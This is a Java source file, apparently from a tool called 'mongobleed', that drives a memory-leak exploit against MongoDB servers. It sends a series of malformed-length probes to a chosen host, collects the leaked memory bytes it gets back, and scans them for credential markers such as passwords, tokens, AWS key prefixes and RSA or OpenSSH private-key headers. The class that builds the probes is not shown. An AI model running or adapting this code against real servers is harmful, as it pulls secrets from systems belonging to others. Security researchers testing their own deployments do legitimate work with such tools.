package com.j0lt.mongobleed;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

public class MongobleedScanner {
    private static final String[] KEYWORDS = new String[] {
            "password", "secret", "key", "token", "admin", "akia",
            "ssh", "private key", "begin rsa", "begin openssh"
    };

    public ScanResult scan(ScanConfig config, ScanProgressListener listener) {
        long start = System.currentTimeMillis();
        List<LeakItem> leaks = new ArrayList<>();
        Set<String> unique = new HashSet<>();
        Set<String> keywordHits = new LinkedHashSet<>();
        int totalBytes = 0;
        int probes = 0;
        boolean cancelled = false;

        for (int docLen = config.minOffset; docLen <= config.maxOffset; docLen += config.step) {
            if (listener != null && listener.isStopRequested()) {
                cancelled = true;
                break;
            }
            if (config.maxProbes > 0 && probes >= config.maxProbes) {
                break;
            }
            probes++;

            byte[] response;
            try {
                response = MongoBleedClient.sendProbe(
                        config.host,
                        config.port,
                        docLen,
                        docLen + config.bufferPad,
                        config.timeoutMs,
                        config.maxResponseBytes
                );
            } catch (IOException e) {
                response = new byte[0];
            }

            List<byte[]> found = MongoBleedClient.extractLeaks(response, config.maxResponseBytes);
            boolean limitReached = false;
            for (byte[] leak : found) {
                if (leak == null || leak.length < config.minLeakLength) {
                    continue;
                }
                String key = Base64.getEncoder().encodeToString(leak);
                if (!unique.add(key)) {
                    continue;
                }
                leaks.add(new LeakItem(docLen, leak));
                totalBytes += leak.length;
                keywordHits.addAll(findKeywords(leak));

                if (config.maxLeaks > 0 && leaks.size() >= config.maxLeaks) {
                    limitReached = true;
                    break;
                }
                if (config.maxTotalBytes > 0 && totalBytes >= config.maxTotalBytes) {
                    limitReached = true;
                    break;
                }
            }

            if (listener != null) {
                listener.onProgress(docLen, config.maxOffset, probes, leaks.size(), totalBytes);
            }

            if (limitReached) {
                break;
            }

            if (config.stopOnFirstLeak && !leaks.isEmpty()) {
                break;
            }
        }

        long duration = System.currentTimeMillis() - start;
        return new ScanResult(leaks, totalBytes, keywordHits, probes, duration, cancelled);
    }

    private Set<String> findKeywords(byte[] data) {
        Set<String> hits = new LinkedHashSet<>();
        if (data == null || data.length == 0) {
            return hits;
        }
        String text = new String(data, StandardCharsets.ISO_8859_1).toLowerCase();
        for (String keyword : KEYWORDS) {
            if (text.contains(keyword)) {
                hits.add(keyword);
            }
        }
        return hits;
    }

    public interface ScanProgressListener {
        void onProgress(int offset, int maxOffset, int probes, int leaksFound, int totalBytes);
        boolean isStopRequested();
    }
}
